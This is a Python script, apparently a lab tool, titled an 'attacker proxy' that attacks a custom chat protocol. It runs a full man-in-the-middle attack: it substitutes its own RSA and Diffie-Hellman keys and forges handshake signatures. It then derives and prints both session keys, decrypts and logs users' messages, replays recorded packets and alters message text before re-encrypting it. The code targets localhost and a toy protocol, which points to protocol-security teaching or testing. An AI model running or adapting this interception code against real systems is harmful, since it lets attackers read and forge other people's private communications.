import socket, threading, json, base64, hashlib, hmac as hmac_lib, os, sys

ATTACKER_HOST = "127.0.0.1"
ATTACKER_PORT = 8888
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 9999

args = sys.argv[1:]
DO_MITM = "--mitm" in args
DO_REPLAY = "--replay" in args
DO_TAMPER = "--tamper" in args
DO_SNIFF = "--sniff" in args
if not any([DO_MITM, DO_REPLAY, DO_TAMPER, DO_SNIFF]):
    DO_MITM = DO_REPLAY = DO_TAMPER = DO_SNIFF = True

def plain(msg): print(f"{msg}", flush=True)
def sniff_log(direction, data):
    if DO_SNIFF:
        plain(f"{direction} | {len(data)} bytes | {data[:32].hex()}...")

from cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

plain("Generating attacker RSA keypair...")
atk_rsa_priv = generate_private_key(public_exponent=65537, key_size=2048)
atk_rsa_pub = atk_rsa_priv.public_key()
atk_rsa_pub_pem = atk_rsa_pub.public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
).decode()
plain("RSA keypair ready")

replay_buffer = []


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Socket closed")
        buf += chunk
    return buf

def recv_raw_packet(sock):
    length_b = recv_exact(sock, 4)
    payload = recv_exact(sock, int.from_bytes(length_b, "big"))
    return length_b, payload

def send_raw(sock, payload: bytes):
    sock.sendall(len(payload).to_bytes(4, "big") + payload)

def derive_keys(shared_secret: bytes):
    derived = HKDF(
        algorithm=hashes.SHA256(), length=64, salt=None,
        info=b"chat-keys", backend=default_backend()
    ).derive(shared_secret)
    return derived[:32], derived[32:]

def decrypt_packet(payload: bytes, aes_key: bytes, hmac_key: bytes):
    try:
        pkt = json.loads(payload)
        nonce = base64.b64decode(pkt["nonce"])
        ciphertext = base64.b64decode(pkt["ciphertext"])
        mac = base64.b64decode(pkt["hmac"])
        expected = hmac_lib.new(hmac_key, nonce + ciphertext, hashlib.sha256).digest()
        if not hmac_lib.compare_digest(mac, expected):
            return None, "HMAC mismatch"
        plaintext = AESGCM(aes_key).decrypt(nonce, ciphertext, None)
        return json.loads(plaintext), None
    except Exception as e:
        return None, str(e)

def encrypt_packet(message_dict: dict, aes_key: bytes, hmac_key: bytes) -> bytes:
    plaintext = json.dumps(message_dict).encode()
    nonce = os.urandom(12)
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)
    mac = hmac_lib.new(hmac_key, nonce + ciphertext, hashlib.sha256).digest()
    return json.dumps({
        "nonce": base64.b64encode(nonce).decode(),
        "ciphertext": base64.b64encode(ciphertext).decode(),
        "hmac": base64.b64encode(mac).decode(),
    }).encode()

def tamper_payload_raw(payload: bytes) -> bytes:
    try:
        pkt = json.loads(payload)
        ct = bytearray(base64.b64decode(pkt["ciphertext"]))
        ct[8] ^= 0xFF
        pkt["ciphertext"] = base64.b64encode(bytes(ct)).decode()
        return json.dumps(pkt).encode()
    except Exception as e:
        plain(f"[TAMPER] Failed: {e}")
        return payload


def handle_client_connection(client_sock, client_addr):
    plain(f"New client from {client_addr}")
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((SERVER_HOST, SERVER_PORT))
    plain("Connected to real server.")

    c_aes = c_hmac = None 
    s_aes = s_hmac = None 

    try:
        # Server hello -> client (intercept RSA pub)
        _, srv_hello_raw = recv_raw_packet(server_sock)
        srv_hello = json.loads(srv_hello_raw)
        dh_params_pem = srv_hello["dh_params"]

        dh_params = serialization.load_pem_parameters(
            dh_params_pem.encode(), backend=default_backend()
        )

        if DO_MITM:
            plain("Replacing server RSA pub with attacker's")
            fwd = json.dumps({"server_rsa_pub": atk_rsa_pub_pem, "dh_params": dh_params_pem}).encode()
        else:
            fwd = srv_hello_raw
        send_raw(client_sock, fwd)

        # Client hello -> server (intercept DH pub, substitute attacker's)
        _, cli_hello_raw = recv_raw_packet(client_sock)
        cli_hello = json.loads(cli_hello_raw)
        username = cli_hello.get("username", "?")
        cli_dh_pub_pem = cli_hello["client_dh_pub"]
        plain(f"Intercepted client hello for user: {username}")

        cli_dh_pub = serialization.load_pem_public_key(
            cli_dh_pub_pem.encode(), backend=default_backend()
        )

        if DO_MITM:
            # Attacker DH keypair for the SERVER side of the tunnel
            atk_dh_priv_srv = dh_params.generate_private_key()
            atk_dh_pub_srv = atk_dh_priv_srv.public_key()
            atk_dh_pub_srv_pem = atk_dh_pub_srv.public_bytes(
                serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode()
            fwd_hello = json.dumps({
                "client_rsa_pub": atk_rsa_pub_pem,
                "client_dh_pub": atk_dh_pub_srv_pem,
                "username": username,
            }).encode()
        else:
            fwd_hello = cli_hello_raw
        send_raw(server_sock, fwd_hello)

        # Server DH pub + sig -> client (substitute attacker's DH pub)
        _, srv_dh_raw = recv_raw_packet(server_sock)
        srv_dh_msg = json.loads(srv_dh_raw)
        srv_dh_pub_pem = srv_dh_msg["server_dh_pub"]

        srv_dh_pub = serialization.load_pem_public_key(
            srv_dh_pub_pem.encode(), backend=default_backend()
        )

        if DO_MITM:
            # Derive attacker<->server session keys
            shared_with_server = atk_dh_priv_srv.exchange(srv_dh_pub)
            s_aes, s_hmac = derive_keys(shared_with_server)
            plain(f"{s_aes.hex()}")

            # Attacker DH keypair for the CLIENT side of the tunnel
            atk_dh_priv_cli = dh_params.generate_private_key()
            atk_dh_pub_cli = atk_dh_priv_cli.public_key()
            atk_dh_pub_cli_pem = atk_dh_pub_cli.public_bytes(
                serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode()

            # Derive attacker<->client session keys
            shared_with_client = atk_dh_priv_cli.exchange(cli_dh_pub)
            c_aes, c_hmac = derive_keys(shared_with_client)
            plain(f"{c_aes.hex()}")

            # Send client our DH pub signed with our RSA key
            fake_sig = atk_rsa_priv.sign(
                atk_dh_pub_cli_pem.encode(),
                asym_padding.PSS(mgf=asym_padding.MGF1(hashes.SHA256()), salt_length=asym_padding.PSS.MAX_LENGTH),
                hashes.SHA256()
            )
            fwd_dh = json.dumps({
                "server_dh_pub": atk_dh_pub_cli_pem,
                "signature": base64.b64encode(fake_sig).decode()
            }).encode()
            plain("Sent attacker DH public and fake sig to client.")
        else:
            fwd_dh = srv_dh_raw
        send_raw(client_sock, fwd_dh)

        # Client sig -> server (re-sign with attacker's RSA key)
        _, cli_sig_raw = recv_raw_packet(client_sock)
        sniff_log("client sig ", cli_sig_raw)

        if DO_MITM:
            atk_sig = atk_rsa_priv.sign(
                atk_dh_pub_srv_pem.encode(),
                asym_padding.PSS(mgf=asym_padding.MGF1(hashes.SHA256()), salt_length=asym_padding.PSS.MAX_LENGTH),
                hashes.SHA256()
            )
            fwd_sig = json.dumps({"signature": base64.b64encode(atk_sig).decode()}).encode()
            plain("handshake complete")
        else:
            fwd_sig = cli_sig_raw
        send_raw(server_sock, fwd_sig)

        # Relay with decryption
        done = threading.Event()

        def relay(src, dst, direction, dec_aes, dec_hmac, enc_aes, enc_hmac):
            pkt_count = 0
            try:
                while True:
                    try:
                        pkt_len_b, payload = recv_raw_packet(src)
                    except (ConnectionError, EOFError):
                        plain(f"{direction} closed.")
                        break

                    sniff_log(direction, payload)

                    forward_payload = payload

                    if dec_aes:
                        msg, err = decrypt_packet(payload, dec_aes, dec_hmac)
                        if msg:
                            mtype = msg.get("type", "?")
                            if mtype == "message":
                                plain(f"{direction} | from={msg.get('sender', username)!r} "
                                      f"seq={msg.get('seq','?')} | \"{msg.get('text','')}\"")
                            elif mtype == "system":
                                plain(f"{direction} | {msg.get('text','')}")
                            else:
                                plain(f"{direction} | {json.dumps(msg)}")

                            # Replay: record and inject
                            if direction.startswith("C") and DO_REPLAY and mtype == "message":
                                # Re-encrypt with server keys so the replayed packet
                                # is valid from the server's perspective
                                server_encrypted = encrypt_packet(msg, enc_aes, enc_hmac)
                                replay_buffer.append(server_encrypted)
                                plain(f"Recorded packet #{len(replay_buffer)} seq={msg.get('seq','?')} text={msg.get('text','')!r}")
                                if len(replay_buffer) == 2:
                                    plain("Injecting replay of packet #1 to server")
                                    dst.sendall(len(replay_buffer[0]).to_bytes(4, "big") + replay_buffer[0])

                            # Tamper: alter every message text, re-encrypt
                            if direction.startswith("C") and DO_TAMPER and mtype == "message":
                                original = msg["text"]
                                msg["text"] = msg["text"] + " [TAMPERED]"
                                plain(f"[TAMPER] {original!r} -> {msg['text']!r}")
                                forward_payload = encrypt_packet(msg, enc_aes, enc_hmac)
                                dst.sendall(len(forward_payload).to_bytes(4, "big") + forward_payload)
                                pkt_count += 1
                                continue

                            # Re-encrypt for destination if keys differ
                            if enc_aes and enc_aes != dec_aes:
                                forward_payload = encrypt_packet(msg, enc_aes, enc_hmac)

                        else:
                            plain(f"[DECRYPT FAIL] {direction}: {err}")

                    else:
                        if direction.startswith("C") and DO_TAMPER:
                            forward_payload = tamper_payload_raw(payload)

                        if direction.startswith("C") and DO_REPLAY:
                            replay_buffer.append(payload)
                            plain(f"Recorded packet #{len(replay_buffer)}")
                            if len(replay_buffer) == 2:
                                plain("Injecting replay")
                                dst.sendall(len(replay_buffer[0]).to_bytes(4, "big") + replay_buffer[0])

                    dst.sendall(len(forward_payload).to_bytes(4, "big") + forward_payload)
                    pkt_count += 1

            except Exception as e:
                plain(f"Relay error ({direction}): {e}")
                import traceback; traceback.print_exc()
            finally:
                done.set()

        if DO_MITM and c_aes and s_aes:
            # C->S: decrypt with client keys, re-encrypt with server keys
            t1 = threading.Thread(target=relay, daemon=True,
                args=(client_sock, server_sock, "C->S", c_aes, c_hmac, s_aes, s_hmac))
            # S->C: decrypt with server keys, re-encrypt with client keys
            t2 = threading.Thread(target=relay, daemon=True,
                args=(server_sock, client_sock, "S->C", s_aes, s_hmac, c_aes, c_hmac))
        else:
            t1 = threading.Thread(target=relay, daemon=True,
                args=(client_sock, server_sock, "C->S", None, None, None, None))
            t2 = threading.Thread(target=relay, daemon=True,
                args=(server_sock, client_sock, "S->C", None, None, None, None))

        t1.start()
        t2.start()
        done.wait()

    except Exception as e:
        plain(f"Handler error: {e}")
        import traceback; traceback.print_exc()
    finally:
        client_sock.close()
        server_sock.close()
        plain(f"Connection to {client_addr} closed.")


def main():
    print("ATTACKER PROXY")
    print(f"Listening {ATTACKER_HOST}:{ATTACKER_PORT} | Server {SERVER_HOST}:{SERVER_PORT}")
    print(f"MITM={DO_MITM} REPLAY={DO_REPLAY} TAMPER={DO_TAMPER} SNIFF={DO_SNIFF}")

    proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy.bind((ATTACKER_HOST, ATTACKER_PORT))
    proxy.listen(10)
    plain(f"Proxy listening on {ATTACKER_HOST}:{ATTACKER_PORT}")

    while True:
        client_sock, client_addr = proxy.accept()
        threading.Thread(
            target=handle_client_connection,
            args=(client_sock, client_addr),
            daemon=False
        ).start()


if __name__ == "__main__":
    main()
